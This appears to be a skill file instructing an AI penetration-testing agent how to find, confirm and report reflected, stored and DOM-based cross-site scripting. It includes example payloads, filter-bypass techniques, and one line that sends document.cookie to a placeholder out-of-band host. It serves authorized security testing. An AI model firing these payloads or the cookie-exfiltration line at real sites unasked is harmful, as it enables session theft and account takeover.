---
name: Cross-Site Scripting
description: Get arbitrary JavaScript to actually execute in another user's browser session - reflected, stored, and DOM-based XSS, plus filter/sanitizer bypass technique. Use on any field that's echoed back in a response (search, error messages, profile/display fields), any field that's stored and rendered later (comments, reviews, usernames, feedback), and any client-side code that reads from the URL/DOM and writes it back into the page.
---

# Cross-Site Scripting

## The three shapes, and why the distinction matters for where you look
- **Reflected**: your input comes back in the *same* response (search results, an error page echoing an invalid parameter, a "no results for X" message). Look at every parameter that shows up anywhere in the response body, not just ones obviously meant for display.
- **Stored**: your input is saved and rendered on a *later* request, possibly to a *different user* (comments, reviews, display names, support tickets, feedback forms, admin-visible fields like a username shown on an internal dashboard). Higher impact by default - a stored payload fires for every victim who views that page, including privileged ones.
- **DOM-based**: no server round-trip at all - client-side JavaScript reads something attacker-influenced (`location.hash`, `location.search`, `document.referrer`, `postMessage` data) and writes it into the DOM via an unsafe sink (`innerHTML`, `document.write`, `eval`, `insertAdjacentHTML`) without ever hitting the server with the payload in a way server-side filtering would see. Read the page's own JavaScript (the `surface` tool's bundle-scanning, or direct source review) for these sink calls rather than guessing blindly.

## Confirming it's real execution, not just reflection
Seeing your payload appear verbatim in HTML source is not confirmation - the browser may have encoded it before rendering, or it may be inside a context (a `<textarea>`, a JSON value, an attribute that isn't executed) where it never runs. Use the `browser` tool to actually load the page and verify: a payload like `<script>fetch('https://<your-oob-host>/xss?c='+document.cookie)</script>` or a simple `alert(1)`-equivalent that you can observe firing (a console message, a network request via `read_network_requests`, a visible DOM change) is the real proof. A payload that only shows up escaped (`&lt;script&gt;`) in the rendered DOM is not exploitable as-is - that's evidence the specific encoding is correct for that context, not a dead end for the whole field (try a different context - an attribute, a JS string, a URL - on the same field).

## Context determines payload shape - match it, don't guess randomly
- **HTML body context** (`<div>USERINPUT</div>`): `<script>...</script>`, or if `<script>` tags are stripped, an event-handler-bearing tag (`<img src=x onerror=...>`, `<svg onload=...>`).
- **HTML attribute context** (`value="USERINPUT"`): break out of the attribute first (`" onmouseover="..." x="`, or `"><script>...</script>` if the tag itself can be closed).
- **JavaScript string context** (`var x = "USERINPUT";`): break out of the string and statement (`";alert(1);//`, accounting for whether quotes are HTML-encoded upstream even inside a `<script>` block - test both raw and encoded forms).
- **URL/attribute context** (`href="USERINPUT"`): `javascript:alert(1)` where the scheme isn't restricted.

## Filter/sanitizer bypass, when the obvious payload is stripped
- **Tag/attribute allowlist gaps**: if `<script>` is blocked but event handlers on allowed tags aren't (`onerror`, `onload`, `onfocus` with `autofocus`), pivot to those.
- **Case and encoding**: `<ScRiPt>`, HTML entity encoding of individual characters (`&#x3C;script&#x3E;`), double-encoding if the filter decodes once before checking.
- **Polyglot payloads** that execute whether they land in an HTML, attribute, or JS-string context - useful for a first probe across many fields before refining to the exact context.
- **Mutation XSS (mXSS)**: some sanitizers parse-then-serialize HTML in a way that a payload can be inert as submitted but becomes executable once the browser's own parser re-interprets the sanitizer's *output* - worth a look specifically when a well-known sanitizer library is in use and straightforward payloads are all blocked.

## Tools
- `browser` to verify actual execution (not just reflection) and to interact with rendered pages for DOM-based cases
- `http`/`shell`+curl for fast payload iteration across reflected contexts before confirming in a real browser
- `surface` and direct source/bundle review for finding DOM sinks fed by `location`/`postMessage`/`document.referrer`

## Reporting
State the field, exact payload, the context it landed in (HTML/attribute/JS-string/DOM-sink), and the proof of actual execution (not just unescaped reflection). Note whether it's reflected (needs the victim to click a crafted link/visit a crafted page) or stored (fires passively for anyone who views the affected page) - that distinction drives both severity and the realistic attack scenario to describe.
